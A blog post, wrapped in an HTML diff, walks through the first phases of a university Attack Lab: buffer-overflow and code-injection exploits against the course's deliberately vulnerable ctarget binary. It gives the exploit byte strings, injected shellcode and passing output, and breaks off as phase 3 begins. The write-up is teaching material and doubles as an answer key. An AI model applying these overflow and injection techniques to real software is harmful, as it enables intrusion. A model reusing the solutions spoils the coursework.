@@ -1,0 +1,892 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico.svg">
+  <link rel="icon" href="/img/ico.svg">
+  
+    <link rel="canonical" href="https://staaaaaaaaar.github.io/2025/10/18/ics-attacklab/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sam">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="北京大学 2025 年秋季学期计算机系统导论 - Attack Lab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICS | 缓冲区溢出，你看你干的好事！">
+<meta property="og:url" content="https://staaaaaaaaar.github.io/2025/10/18/ics-attacklab/index.html">
+<meta property="og:site_name" content="Sam&#39;s Blog">
+<meta property="og:description" content="北京大学 2025 年秋季学期计算机系统导论 - Attack Lab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://staaaaaaaaar.github.io/img/ics-attacklab/stack-smashing-attack.png">
+<meta property="og:image" content="https://staaaaaaaaar.github.io/img/ics-attacklab/code-injection-attack.png">
+<meta property="og:image" content="https://staaaaaaaaar.github.io/img/ics-attacklab/rop-attack.png">
+<meta property="article:published_time" content="2025-10-18T14:52:06.000Z">
+<meta property="article:modified_time" content="2025-10-18T12:50:37.472Z">
+<meta property="article:author" content="Sam">
+<meta property="article:tag" content="ics">
+<meta property="article:tag" content="pku">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://staaaaaaaaar.github.io/img/ics-attacklab/stack-smashing-attack.png">
+  
+  
+  
+  <title>ICS | 缓冲区溢出，你看你干的好事！ - Sam&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_5041124_rijwqilvw8k.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"staaaaaaaaar.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"3a3Cp4NiDrGee9qpOahv5XgE-gzGzoHsz","app_key":"BESWGe4b2P4LbQ81Wqhin03D","server_url":"https://3a3cp4ni.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sam&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ICS | 缓冲区溢出，你看你干的好事！"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-18 14:52" pubdate>
+          October 18, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          109 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ICS | 缓冲区溢出，你看你干的好事！</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    Last updated on October 18, 2025 pm
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>在 Attack Lab 中，我们要针对三个存在不同安全漏洞的程序，设计并实现总计六种攻击方案。三个程序有着不同的安全性，可能会有栈随机化保护和栈破坏检测，我们要实现的攻击类型有栈粉碎攻击，代码注入攻击和 ROP 攻击。</p>
+<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="汇编语言和-GDB-工具"><a href="#汇编语言和-GDB-工具" class="headerlink" title="汇编语言和 GDB 工具"></a>汇编语言和 GDB 工具</h2><p>在 Attack Lab 中，我们需要阅读和理解反汇编代码，有时需要使用 GDB 工具进行调试和分析程序行为。</p>
+<h2 id="栈粉碎攻击"><a href="#栈粉碎攻击" class="headerlink" title="栈粉碎攻击"></a>栈粉碎攻击</h2><p>栈粉碎攻击是一种常见的缓冲区溢出攻击形式，通过向程序输入超长数据，覆盖栈上的返回地址或其他关键数据，从而破坏程序正常控制流。</p>
+<p><img src="/img/ics-attacklab/stack-smashing-attack.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h2><p>代码注入攻击指攻击者将恶意代码植入目标程序的内存中，并通过溢出等手段跳转至该代码执行。<br><img src="/img/ics-attacklab/code-injection-attack.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ROP-攻击"><a href="#ROP-攻击" class="headerlink" title="ROP 攻击"></a>ROP 攻击</h2><p>ROP（Return-Oriented Programming）攻击是一种高级代码复用技术，通过组合程序中已有的代码片段（称为 gadgets）来构建恶意功能链。<br><img src="/img/ics-attacklab/rop-attack.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><h2 id="了解-target"><a href="#了解-target" class="headerlink" title="了解 target"></a>了解 target</h2><p>在开始攻击之前，我们需要了解目标程序的功能和漏洞。Attack Lab 提供了三个目标程序：<code>ctarget</code>、<code>rtarget</code> 和 <code>starget</code>。通过阅读文档，我们知道三者有着相似的读取输入的逻辑。</p>
+<p><code>ctarget</code> 和 <code>rtarget</code> 通过下面定义的 <code>getbuf</code> 函数从标准输入读取字符串：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">getbuf</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>gets()</code> 函数无法判断其目标缓冲区是否足以存储将要读取的字符串。该函数会直接复制字节序列，这可能导致超出目标位置已分配存储空间的边界（即发生缓冲区溢出）。</p>
+<p><code>starget</code> 程序同样会从标准输入读取字符串。不过，它使用的是另一个函数 <code>getbuf_with_canary</code>（带金丝雀值的 <code>getbuf</code> 函数）来实现这一操作:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">getbuf_withcanary</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>    <span class="hljs-type">char</span> logMsg[<span class="hljs-number">128</span>];<br>    len = <span class="hljs-number">0</span>;<br>    Gets(buf);<br>    <span class="hljs-built_in">memcpy</span>(logMsg + len, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="反汇编-target"><a href="#反汇编-target" class="headerlink" title="反汇编 target"></a>反汇编 target</h2><p>在 Attack Lab 中，我们可以使用 <code>objdump</code> 工具对目标程序进行反汇编，以便查看其汇编代码和了解栈空间情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d ctarget &gt; ctarget.s<br>objdump -d rtarget &gt; rtarget.s<br>objdump -d starget &gt; starget.s<br></code></pre></td></tr></table></figure>
+
+<h2 id="生成指令序列的字节码"><a href="#生成指令序列的字节码" class="headerlink" title="生成指令序列的字节码"></a>生成指令序列的字节码</h2><p>在 Attack Lab 中，要想实现代码注入，我们需要将汇编指令转换为对应的字节码。具体步骤如下：</p>
+<ol>
+<li>编写汇编代码并保存为 <code>example.s</code> 文件：</li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pushq   <span class="hljs-number">$0</span>xabcdef  # <span class="hljs-keyword">Push</span> value onto stack<br>addq    <span class="hljs-number">$17</span>, %rax   # <span class="hljs-keyword">Add</span> <span class="hljs-number">17</span> to %rax<br>movl    %eax, %edx  # Copy lower <span class="hljs-number">32</span> <span class="hljs-meta">bits</span> to %edx<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>使用 <code>gcc</code> 工具将汇编代码编译为目标文件：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -c example.s -o example.o<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>使用 <code>objdump</code> 工具反汇编：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d example.o &gt; example.d<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>查看反汇编结果，获取对应的字节码：</li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol"></span><br><span class="hljs-symbol">example.o:</span>     file format elf64-x86-<span class="hljs-number">64</span><br><br><br>Disassembly of <span class="hljs-meta">section</span> .text:<br><br><span class="hljs-number">140000000000000000</span> &lt;.text&gt;:<br>   <span class="hljs-number">0</span>: <span class="hljs-number">68</span> ef cd ab <span class="hljs-number">00</span>    pushq   <span class="hljs-number">$0</span>xabcdef<br>   <span class="hljs-number">5</span>: <span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">11</span>       <span class="hljs-keyword">add</span>     <span class="hljs-number">$0</span>x11, %rax<br>   <span class="hljs-number">9</span>: <span class="hljs-number">89</span> c2             <span class="hljs-keyword">mov</span>     %eax, %edx<br></code></pre></td></tr></table></figure>
+
+<h2 id="hex2raw-工具"><a href="#hex2raw-工具" class="headerlink" title="hex2raw 工具"></a>hex2raw 工具</h2><p>在 Attack Lab 中，由于 <code>target</code> 以字符串的形式读入，我们需要使用 <code>hex2raw</code> 工具将十六进制字符串转换为原始字节序列，以便构造攻击载荷。该工具的使用方法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hex2raw &lt; phase.txt &gt; phase.raw<br></code></pre></td></tr></table></figure>
+
+<p>然后，我们可以将生成的 <code>phase.raw</code> 文件作为输入传递给目标程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ ctarget &lt; phase.raw<br>./ ctarget -i phase.raw<br></code></pre></td></tr></table></figure>
+
+<p>或者使用流水线方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase.txt | ./hex2raw | ./ctarget<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h1><p>在 phase 1 中，我们需要针对 <code>ctarget</code> 程序实现栈粉碎攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    val = getbuf();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch1</span><span class="hljs-params">()</span><br>&#123;<br>    vlevel = <span class="hljs-number">1</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch1!: You called touch1()\n&quot;</span>);<br>    validate(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到 <code>touch1</code> 函数。为此，我们需要覆盖栈上的返回地址，使其指向 <code>touch1</code> 函数的地址。</p>
+<p>我们先查看一下 <code>getbuf</code> 函数的汇编代码，了解一下函数的栈空间是如何分布的。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">0000000000401ba7 &lt;getbuf&gt;:<br>  401ba7:	f3 0f 1e fa          	endbr64<br>  401bab:	<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          	<span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x18,%rsp<br>  401baf:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> e7             	<span class="hljs-keyword">mov</span>    %rsp,%rdi<br>  401bb2:	e8 <span class="hljs-number">57</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">call</span>   401f0e &lt;Gets&gt;<br>  401bb7:	b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x1,%eax<br>  401bbc:	<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          	<span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x18,%rsp<br>  401bc0:	c3                   	<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>从汇编代码中，我们可以看到 <code>getbuf</code> 函数在栈上分配了 0x18（24）字节的空间用于局部变量 <code>buf</code>。因此，我们需要输入超过 24 字节的数据来覆盖返回地址。从汇编代码中，我们还可以看到 <code>touch1</code> 函数的地址是 <code>0x401c33</code>。</p>
+<p>于是，我们可以构造如下的输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase1.txt */<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>33 1c 40 00 00 00 00 00 /* Address of touch1() */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase1.txt | ./hex2raw | ./ctarget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch1!: You called touch1()<br>Valid solution for level 1 with target ctarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h1><p>在 phase 2 中，我们需要针对 <code>ctarget</code> 程序实现代码注入攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    val = getbuf();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>    vlevel = <span class="hljs-number">2</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要构造一个输入，使得 <code>getbuf</code> 函数返回后，程序的控制流跳转到我们注入的代码，并调用 <code>touch2</code> 函数。为此，我们需要注入一段代码，该代码将 cookie 的值 <code>mov</code> 给 <code>%edi</code> 作为参数，并将 <code>touch2</code> 函数的地址 <code>pushq</code> 压入栈中，最后 <code>ret</code> 返回，这样程序就会跳转到 <code>touch2</code> 函数执行。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">; phase 2 injected code</span><br><span class="hljs-number">0000000000000000</span> &lt;.text&gt;:<br>   <span class="hljs-number">0</span>:	bf <span class="hljs-number">66</span> ce c8 <span class="hljs-number">24</span>       	<span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x24c8ce66,%edi<br>   <span class="hljs-number">5</span>:	<span class="hljs-number">68</span> <span class="hljs-number">67</span> 1c <span class="hljs-number">40</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">push</span>   <span class="hljs-number">$0</span>x401c67<br><span class="hljs-symbol">   a:</span>	c3                   	<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p>除此之外，我们还需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 <code>getbuf</code> 函数的返回地址。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">0000000000401ba7 &lt;getbuf&gt;:<br>  401ba7:	f3 0f 1e fa          	endbr64<br>  401bab:	<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          	<span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x18,%rsp<br>  401baf:	<span class="hljs-number">48</span> <span class="hljs-number">89</span> e7             	<span class="hljs-keyword">mov</span>    %rsp,%rdi<br>  401bb2:	e8 <span class="hljs-number">57</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">call</span>   401f0e &lt;Gets&gt;<br>  401bb7:	b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	<span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x1,%eax<br>  401bbc:	<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          	<span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x18,%rsp<br>  401bc0:	c3                   	<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb ctarget<br>b *(getbuf + 8)<br>layout asm<br>layout regs<br>r<br>p <span class="hljs-variable">$rsp</span><br></code></pre></td></tr></table></figure>
+
+<p>通过调试，我们发现栈指针 <code>%rsp</code> 指向 <code>0x5566c3e8</code> 且正是字符串的储存地址（调试细节此处未呈现）。因此，我们可以构造如下的输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">/* phase2.txt */<br>bf 66 ce c8 24       	/* mov    $0x24c8ce66, %edi */<br>68 67 1c 40 00       	/* push   $0x401c67 */<br>c3                   	/* ret */<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00<br>e8 c3 66 55 00 00 00 00 /* Address of injected code */<br></code></pre></td></tr></table></figure>
+
+<p>转换为原始字节序列并传递给 <code>ctarget</code> 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> phase2.txt | ./hex2raw | ./ctarget<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Cookie: 0x24c8ce66<br>Type string:Touch2!: You called touch2(0x24c8ce66)<br>Valid solution for level 2 with target ctarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h1><p>在 phase 3 中，我们需要针对 <code>ctarget</code> 程序实现代码注入攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> val;<br>    val = getbuf();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure>
+
